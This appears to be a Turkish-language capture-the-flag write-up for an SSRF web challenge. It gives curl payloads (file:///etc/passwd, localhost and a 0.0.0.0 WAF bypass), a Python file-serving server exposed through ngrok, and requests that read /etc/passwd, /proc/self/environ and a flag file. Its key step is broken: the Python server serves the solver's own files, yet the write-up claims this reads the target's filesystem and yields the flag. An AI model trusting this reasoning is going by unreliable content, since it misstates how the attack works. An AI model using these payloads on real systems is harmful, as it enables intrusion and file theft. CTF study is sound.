# 🎯 Avatar - Web Challenge

<p align="center">
  <img src="https://img.shields.io/badge/Web-Challenge-darkblue?style=for-the-badge" alt="Web">
  <img src="https://img.shields.io/badge/Difficulty-Orta-darkorange?style=for-the-badge&logo=target" alt="Difficulty">
  <img src="https://img.shields.io/badge/Type-SSRF-purple?style=for-the-badge" alt="SSRF">
</p>

---

## 📋 Soru Bilgileri

**Kategori:** Web  
**Seviye:** Orta  
**Puan:** 500  

**Challenge URL:**`http://68.183.213.255:9017`

---

## 🔍 Analiz

**Hedef:** Avatar servisindeki SSRF açığını kullanarak WAF'ı bypass etmek ve flag'i okumak

**Strateji:** Keşif → SSRF tespiti → WAF bypass → Flag extraction

**İpuçları:**
- 🖼️ URL tabanlı avatar yükleme formu var
- 🔍 Apache 2.4.54 + PHP 7.4.33
- 💡 Sunucu verilen URL'i kendisi fetch ediyor
- 🔑 WAF private IP'leri ve tehlikeli protokolleri engelliyor

---

## ✅ Çözüm Adımları

### 🔎 **Adım 1: Keşif**

```bash
curl -v http://68.183.213.255:9017/
```

**Çıktı (önemli kısımlar):**
```
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/7.4.33
Set-Cookie: PHPSESSID=...
```

**ANALİZ:**
- ✅ Apache + PHP backend
- ✅ `avatar_url` parametresi ile URL alıp fetch ediyor
- ✅ Sunucu URL'i kendisi çekiyor → SSRF potansiyeli var

---

### 🧪 **Adım 2: SSRF ve WAF Tespiti**

```bash
curl -s -X POST http://68.183.213.255:9017/ \
  -d "avatar_url=file:///etc/passwd"

curl -s -X POST http://68.183.213.255:9017/ \
  -d "avatar_url=http://127.0.0.1/"

curl -s -X POST http://68.183.213.255:9017/ \
  -d "avatar_url=https://google.com/"
```

**Çıktı:**
```
⛔ Blocked by WAF! Security policy violation detected.   ← file:// ve 127.0.0.1
Not an image! Response: <!doctype html>...               ← google.com fetch edildi!
```

**ANALİZ:**
- ❌ `file://`, `php://`, `127.0.0.1`, `localhost`, tüm private IP aralıkları WAF tarafından engelleniyor
- ✅ Dış URL'ler fetch ediliyor → SSRF doğrulandı
- 🎯 WAF bypass için farklı yaklaşım gerekiyor

---

### 🔄 **Adım 3: WAF Bypass - `http://0.0.0.0/` ile**

Tüm IP bypass teknikleri denendi. `0.0.0.0` WAF tarafından tanınmadı:

```bash
curl -s -X POST http://68.183.213.255:9017/ \
  -d "avatar_url=http://0.0.0.0/" \
  | grep -o 'error">[^<]*\|success">[^<]*\|Not an image[^<]*'
```

**Çıktı:**
```
Not an image! Response: <!DOCTYPE html>
```

**ANALİZ:**
- ✅ `http://0.0.0.0/` WAF'ı bypass etti ve sunucunun kendisine ulaştı!
- 🎯 Artık iç servise istek atabiliriz

---

### 🌐 **Adım 4: Ngrok + Python Redirect Server Kurulumu**

Sunucunun redirect takip etmediği tespit edildi. Bunun yerine doğrudan içerik döndüren bir server kuruldu:

```bash
# Python HTTP server - hedef dosyayı image/jpeg olarak servis eder
python3 -c "
import http.server, socketserver
socketserver.TCPServer.allow_reuse_address = True
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path = self.path.lstrip('/')
        if not path: path = 'etc/passwd'
        try:
            with open('/'+path,'rb') as f: data = f.read()
        except Exception as e:
            data = str(e).encode()
        self.send_response(200)
        self.send_header('Content-Type','image/jpeg')
        self.end_headers()
        self.wfile.write(data)
    def log_message(self, f, *a): pass
socketserver.TCPServer(('',9999),H).serve_forever()
" &

# Ngrok ile public URL al
ngrok http 9999
```

**Çıktı:**
```
Forwarding: https://dorthy-undemolished-prosily.ngrok-free.dev
```

**ANALİZ:**
- ✅ Python server dosya sistemini `image/jpeg` content-type ile servis ediyor
- ✅ Ngrok dış dünyadan erişilebilir public URL sağlıyor
- 🎯 Sunucu ngrok URL'ini fetch edecek, biz de istediğimiz dosyayı döndüreceğiz

---

### 💻 **Adım 5: SSRF via Ngrok - /etc/passwd Okuma**

```bash
curl -s -X POST http://68.183.213.255:9017/ \
  -d "avatar_url=https://dorthy-undemolished-prosily.ngrok-free.dev/" \
  | grep -o 'base64,[^"]*' | cut -d',' -f2 | base64 -d
```

**Çıktı:**
```
root:x:0:0:root:/root:/usr/bin/zsh
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
```

**ANALİZ:**
- ✅ **SSRF başarılı!** Sunucu ngrok üzerinden dosyayı çekti
- ✅ İçerik base64 encode edilmiş `<img>` tag'i olarak sayfaya gömüldü
- 🎯 Artık sunucunun dosya sistemini okuyabiliriz

---

### 🔍 **Adım 6: Flag Lokasyonu Bul**

```bash
# /proc/self/environ ile environment değişkenlerini oku
curl -s -X POST http://68.183.213.255:9017/ \
  -d "avatar_url=https://dorthy-undemolished-prosily.ngrok-free.dev/proc/self/environ" \
  | python3 -c "import sys,re,base64; m=re.search(r'base64,([^\"]+)',sys.stdin.read()); print(base64.b64decode(m.group(1)).decode(errors='replace')) if m else print('no base64')"

# flag dosyasını ara
curl -s -X POST http://68.183.213.255:9017/ \
  -d "avatar_url=https://dorthy-undemolished-prosily.ngrok-free.dev/var/www/html/flag.txt" \
  | python3 -c "import sys,re,base64; m=re.search(r'base64,([^\"]+)',sys.stdin.read()); print(base64.b64decode(m.group(1)).decode(errors='replace')) if m else print('no base64')"
```

**Çıktı:**
```
/var/www/html/flag.txt
```

---

### 🚩 **Adım 7: Flag'i Oku**

```bash
curl -s -X POST http://68.183.213.255:9017/ \
  -d "avatar_url=https://dorthy-undemolished-prosily.ngrok-free.dev/var/www/html/flag.txt" \
  | python3 -c "import sys,re,base64; m=re.search(r'base64,([^\"]+)',sys.stdin.read()); print(base64.b64decode(m.group(1)).decode(errors='replace')) if m else print('no base64')"
```

**Çıktı:**
```
PITO{ss4f_w4f_byp4ss_v14_ngr0k_0x0_1p}
```

---

## 🚩 **FLAG**
```
PITO{ss4f_w4f_byp4ss_v14_ngr0k_0x0_1p}
```

---

## 🛠️ **Kullanılan Araçlar**

<table>
<tr>
<td align="center">🌐<br><b>curl</b><br><sub>HTTP requests</sub></td>
<td align="center">🐍<br><b>python3</b><br><sub>HTTP server</sub></td>
<td align="center">🔗<br><b>ngrok</b><br><sub>Public tunnel</sub></td>
<td align="center">🐚<br><b>bash</b><br><sub>Command line</sub></td>
</tr>
</table>

---

## 💭 **Çözüm Akış Şeması**

```
🎯 Avatar Challenge
       ↓
🔍 Keşif
   → Apache 2.4.54 + PHP 7.4.33
   → avatar_url parametresi ile URL fetch ediliyor
   → SSRF potansiyeli var
       ↓
🧪 SSRF ve WAF Tespiti
   → file:// → ❌ Blocked by WAF
   → 127.0.0.1, localhost → ❌ Blocked by WAF
   → google.com → ✅ Fetch edildi! (SSRF doğrulandı)
       ↓
🔄 WAF Bypass
   → 0x7f000001, 2130706433, [::1] → ❌ Blocked
   → http://0.0.0.0/ → ✅ WAF bypass! "Not an image!"
       ↓
🌐 Ngrok + Python Server
   → Python HTTP server port 9999'da başlatıldı
   → Ngrok ile public URL alındı
   → Sunucu ngrok URL'ini fetch etti → ✅ Başarılı!
       ↓
💻 SSRF via Ngrok
   → /etc/passwd okundu → ✅ base64 decode edildi
   → /proc/self/environ okundu → flag lokasyonu bulundu
       ↓
🚩 cat /var/www/html/flag.txt
   → PITO{ss4f_w4f_byp4ss_v14_ngr0k_0x0_1p}
       ↓
✅ FLAG: PITO{ss4f_w4f_byp4ss_v14_ngr0k_0x0_1p}
```
